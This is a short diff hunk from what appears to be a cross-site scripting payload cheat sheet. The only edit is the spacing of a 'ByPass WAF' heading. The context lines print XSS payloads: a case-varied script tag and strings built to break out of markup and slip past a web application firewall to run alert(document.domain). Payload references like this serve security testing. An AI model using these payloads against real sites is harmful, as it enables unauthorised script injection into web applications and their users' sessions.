@@ -14,7 +14,7 @@
     <ScRiPt>alert(1)</sCriPt>
 
 
-##ByPass WAF
+## ByPass WAF
 
     </script><svg><script>alert(1)-%26apos%3B
     anythinglr00</script><script>alert(document.domain)</script>uxldz
